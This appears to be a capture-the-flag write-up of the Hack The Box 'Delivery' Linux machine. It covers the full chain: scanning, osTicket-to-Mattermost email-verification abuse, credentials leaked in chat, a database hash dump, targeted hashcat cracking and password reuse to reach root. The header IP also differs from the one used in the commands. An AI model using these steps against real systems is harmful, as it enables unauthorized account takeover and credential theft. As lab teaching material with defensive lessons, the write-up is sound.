# HTB: Delivery

**Difficulty:** Easy
**OS:** Linux
**Target IP:** 10.129.63.136
**Attacker IP:** 10.10.15.146

---

## 1. Reconnaissance

### Port Scanning

I started with a fast port sweep, then followed up with a detailed service scan.

```bash
rustscan -a 10.129.63.118
```

```
Open 10.129.63.118:22
Open 10.129.63.118:80
Open 10.129.63.118:8065
```

```bash
nmap -sCV -p22,80,8065 10.129.63.118 -oA nmap/nmap
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http    nginx 1.14.2
|_http-title: Welcome
8065/tcp open  http    Golang net/http server
|_http-title: Mattermost
| http-robots.txt: 1 disallowed entry
|_/
```

I got SSH, a plain nginx site on 80, and a **Mattermost** instance (a Slack-style team chat platform, written in Go — which explains the "Golang net/http server" banner) on 8065. Two separate web applications on one box meant I had two independent attack surfaces to enumerate, and I treated them that way rather than assuming they'd overlap.

---

## 2. Web Enumeration

### 2.1 Port 80

```bash
ffuf -u http://10.129.63.118/FUZZ \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt \
  -e .php,.html,.cgi,.txt -mc 200,301,302,303,403 -fs 10850
```

```
images                  [Status: 301]
assets                  [Status: 301]
error                   [Status: 301]
```

Nothing immediately useful here — just static asset directories. I moved on to the other web app rather than digging further into a page with no obvious functionality.

### 2.2 Discovering the Helpdesk Subdomain

I checked `helpdesk.delivery.htb` — I'd picked up this hostname from the site's own branding/links while browsing port 80 — and added it to `/etc/hosts` pointing at the target.

```bash
ffuf -u http://helpdesk.delivery.htb/FUZZ \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt \
  -e .php,.html,.cgi,.txt -mc 200,301,302,303,403 -fs 4933
```

```
view.php                [Status: 200]
account.php             [Status: 200]
open.php                [Status: 200]
manage.php              [Status: 200]
captcha.php             [Status: 200]
logout.php              [Status: 302]
kb                      [Status: 301]
api                     [Status: 301]
```

This came back with `view.php`, `open.php`, `account.php` — a full **osTicket** helpdesk application. That's a real attack surface: helpdesk systems accept unauthenticated input from the public by design (that's the whole point of a support ticket form), which makes them a common source of information leaks.

### 2.3 Confirming Mattermost's Own Structure

```bash
ffuf -u http://delivery.htb:8065/FUZZ \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt \
  -e .php,.html,.cgi,.txt -mc 200,301,302,303,403 -fs 3108
```

```
index.html              [Status: 301]
robots.txt              [Status: 200]
```

Nothing in `robots.txt`, and nothing else new — Mattermost's real functionality lives behind its own account system rather than static files, so I turned my attention to actually creating an account on it, which is where the helpdesk ticket became useful.

---

## 3. Exploitation — Foothold

### 3.1 Opening a Support Ticket

I opened a new ticket on the osTicket helpdesk using throwaway credentials (`test@test.com` / `test`):

```
You may check the status of your ticket, by navigating to the Check Status page using ticket id: 9669049.

If you want to add more information to your ticket, just email 9669049@delivery.htb.
```

This immediately told me something important: osTicket auto-generates a unique **per-ticket email address** (`<ticket-id>@delivery.htb`) so that replying to the ticket by email gets threaded back into the same conversation. That's a legitimate helpdesk feature — but it also means it's a real, working email address on the domain that I now controlled the inbox for, indirectly, through the ticket thread.

### 3.2 Registering on Mattermost With the Ticket's Email

I went to Mattermost and registered a new account using that same address, `9669049@delivery.htb`. Since Mattermost requires email verification before letting a new account log in, it sent a verification email — and because that address routes straight back into my osTicket ticket thread, I didn't need real inbox access at all. I just refreshed the ticket page and the verification email showed up there as a new reply:

```
---- Registration Successful ---- Please activate your email by going to:
http://delivery.htb:8065/do_verify_email?token=w6kjtmttoykocpc1o7b6e8oakp1g37y3kem97wrknp4tdgi4ttkjh71wmup9ceww&email=9669049%40delivery.htb
```

This worked because osTicket's ticket-to-email bridge and Mattermost's registration flow had no idea about each other — osTicket just treats any inbound mail to that address as a ticket reply, with no validation of who's actually reading it, and I was the one reading it since I owned the ticket. Following that verification link activated my Mattermost account.

### 3.3 Reading Internal Chat History

Logged into Mattermost as `9669049@delivery.htb` / `Newpass@123`, I could now read the team's internal channels. One conversation between a developer and `root` gave me exactly what I needed:

```
@developers Please update theme to the OSTicket before we go live.
Credentials to the server are maildeliverer:Youve_G0t_Mail!

Also please create a program to help us stop re-using the same passwords everywhere....
Especially those that are a variant of "PleaseSubscribe!"
```

Two separate leaks here, and the second one was arguably more valuable than the first: not only did I get direct SSH credentials (`maildeliverer:Youve_G0t_Mail!`), but `root` also told me — in plain text — that the whole team's passwords are variations on **`PleaseSubscribe!`**. I made a note of that for later; it's exactly the kind of pattern a wordlist-based cracking approach can exploit.

### 3.4 SSH Access

```bash
ssh maildeliverer@delivery.htb
```

```
maildeliverer@delivery.htb's password:
Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64
maildeliverer@Delivery:~$
```

✅ Foothold obtained as `maildeliverer` — the credentials leaked in the chat worked directly.

---

## 4. Privilege Escalation

### 4.1 Automated Enumeration

I ran `linpeas.sh` to sweep the system for anything worth chasing, rather than manually walking every directory by hand.

```
╔══════════╣ Unexpected in /opt (usually empty)
drwxrwxr-x 12 mattermost mattermost 4096 Jul 14  2021 mattermost
```

`/opt` isn't normally populated on a stock Debian install, so linpeas flagging it made sense — and it pointed directly at the Mattermost installation itself, which I already knew was running as its own service account (`mattermost`) separate from the account I'd just landed on.

### 4.2 Reading Mattermost's Own Config

```bash
cat /opt/mattermost/config/config.json
```

Inside the `SqlSettings` block:

```json
"DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8&readTimeout=30s&writeTimeout=30s"
```

This is the database connection string Mattermost itself uses to talk to its backend MariaDB instance — and it was sitting in plaintext in the config file, readable because `maildeliverer` had access into `/opt/mattermost/config`. That gave me the MySQL username (`mmuser`) and password (`Crack_The_MM_Admin_PW`) needed to connect directly to the database Mattermost stores all its user accounts and password hashes in.

### 4.3 Dumping the Users Table

```bash
mysql -u mmuser -p'Crack_The_MM_Admin_PW' -h 127.0.0.1 mattermost
```

```sql
SELECT * FROM Users;
```

Among the returned rows, one stood out immediately:

```
| dijg7mcf4tf3xrgxi5ntqdefma | ... | root | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO | ... | root@delivery.htb | ... | system_admin system_user | ...
```

That's a **bcrypt hash** (`$2a$` prefix) for the `root` account's Mattermost login — connecting directly to the database let me read every stored password hash, including the one belonging to the account that had already leaked me the "we reuse `PleaseSubscribe!` variants" hint.

### 4.4 Cracking It — Why the Hint Mattered

I isolated the hash:

```bash
cat hash
```

```
root:$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO
```

Rather than throwing a huge generic wordlist at this bcrypt hash — which would have been painfully slow, since bcrypt is deliberately expensive to compute — I used exactly the piece of intelligence `root` had handed me earlier in the chat. I seeded a single-entry wordlist with the known base password and let a **mutation rule list** generate variations of it:

```bash
cat pass
```

```
PleaseSubscribe!
```

```bash
hashcat -m 3200 hash pass --user -r best64.rule
```

I used `best64.rule` (a standard hashcat mutation rule set: appending digits, capitalizing, common substitutions, etc.) specifically because I wasn't guessing a *base* password — I already knew it. What I was missing was the *exact variant*, and `root`'s own comment ("variant of PleaseSubscribe!") told me that's precisely the kind of transformation to test for. This turned an intractable brute-force problem into a handful of candidates:

```
$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
...
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
```

Cracked in seconds: **`PleaseSubscribe!21`** — the root account's actual password, following exactly the reuse pattern the team had complained about but never fixed.

### 4.5 Escalating to Root

Since this was the same account's Mattermost password, and password reuse across services is extremely common (and exactly what the chat conversation warned about), I tried it directly as the Linux `root` password on the box itself:

```bash
su root
```

```
Password:
root@Delivery:/# whoami
root
```

✅ Root access obtained — the password worked because it was reused across Mattermost and the actual OS account, the very failure mode the team had flagged internally but apparently never acted on.

---

## 5. Summary

| Stage | Technique |
|-------|-----------|
| Recon | `rustscan` + `nmap` → SSH, a static nginx site, and a Mattermost chat instance |
| Web Enum | `ffuf` uncovered the `helpdesk.delivery.htb` osTicket instance |
| Foothold — Part 1 | Opened an osTicket ticket, then registered on Mattermost with that ticket's auto-generated email address, reading the verification link straight out of the ticket thread — bypassing the need for real inbox access |
| Foothold — Part 2 | Read leaked SSH credentials (`maildeliverer:Youve_G0t_Mail!`) directly out of an internal Mattermost channel, along with a hint that passwords across the org are variants of `PleaseSubscribe!` |
| Privilege Escalation | Found Mattermost's database credentials in plaintext in `config.json`; dumped the `Users` table over MySQL to get `root`'s bcrypt hash; cracked it in seconds using the leaked base password with hashcat's `best64.rule`; reused the recovered password directly as the Linux `root` password |

**Root cause / lessons learned:**
- Auto-generated per-ticket email addresses in helpdesk systems are a real attack surface — any service that lets an untrusted user "own" an email address (even indirectly, via a ticket thread) can be abused to complete email-verification flows on unrelated third-party services.
- Internal chat channels are not a safe place to share credentials, even "temporarily" — the moment I could read the channel, every credential ever posted in it was compromised.
- Application config files that embed plaintext database credentials are a standing risk for any account with filesystem read access to them; that risk compounds badly when the database itself stores other systems' password hashes.
- The root cause underneath everything here was password reuse — the same `PleaseSubscribe!`-based password protected the Mattermost `root` account and the actual Linux root account, so cracking one hash was functionally equivalent to compromising the whole box. The team's own internal warning about this exact problem never got acted on.

---

## 6. Tools Used

- `rustscan`, `nmap` — reconnaissance
- `ffuf` — content discovery across both web applications
- osTicket helpdesk (ticket-to-email bridge) — used to complete Mattermost's email verification indirectly
- Mattermost — internal chat, source of leaked SSH credentials and the password-reuse hint
- `ssh` — foothold access
- `linpeas.sh` — automated privilege-escalation enumeration
- `mysql` client — direct database access using credentials found in Mattermost's config
- `hashcat` (`-m 3200`, `best64.rule`) — targeted bcrypt cracking using a known base password
- `su` — privilege escalation via reused credentials
